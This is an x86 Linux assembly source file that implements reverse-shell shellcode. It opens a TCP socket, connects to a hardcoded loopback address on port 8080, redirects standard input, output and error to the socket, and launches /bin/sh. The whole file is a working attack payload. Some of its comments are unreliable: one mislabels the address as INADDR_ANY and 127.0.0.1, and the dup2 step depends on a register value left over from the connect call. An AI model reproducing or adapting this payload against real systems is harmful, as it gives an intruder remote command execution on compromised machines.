;;; Will be using socketcall - 102 for socket related calls


global _start

section .text

	_start:
	
;;Socket

	xor ebx, ebx 	; cleaning EBX
	mul ebx		; cleaning EAX
	xor edi, edi	; cleaning EDI
	
	
	push eax	; IPPROTO_IP = 0
	push byte 1	; SOCK_STREAM = 1
	push byte 2	; AF_INET = 2
	mov ecx, esp	; Moved Stack content to ECX
	
	mov al, 102 
	inc bl
	int 0x80
	xchg edi, eax	; Got new socket descriptor. Will be used for further calls

;;Connect
	
;	pop edx		; Cleared ESP
	xor ecx, ecx	; Cleaning ECX
	mul ecx		; Cleaning EAX
	

	; this is for struct addr_in
	push 0x0101017f	; INADDR_ANY = 127.0.0.1 (big endian)
	push word 0x901f; Port 8080
	push word 0x2 	; AF_INET = 2
	mov ecx, esp	; moved details to ecx

	push 0x10	; standard ip address length
	push ecx	; pushing addr_in
	push edi	; SOCKFD value
	mov ecx, esp	; got all arg in ECX
	mov al, 102	; Socket call
	mov bl, 3	; Connect 
	int 0x80	
	


;;Dup2
	
	xor ecx, ecx
	mul eax
	mov cl, 2

dup2:
	mov al, 63
	int 0x80
	dec ecx
	jns dup2

;;Execve for /bin/sh
	
	xor edx, edx
	xor eax, eax
	push eax
       	push 0x68732f2f      ; hs// - take care to the little endian representation
	push 0x6e69622f      ; nib/
	mov ebx, esp         ; pointer to command string
	mov ecx, eax
  	mov edx, eax
  	mov al, 11           ; __NR_execve
  	int 0x80
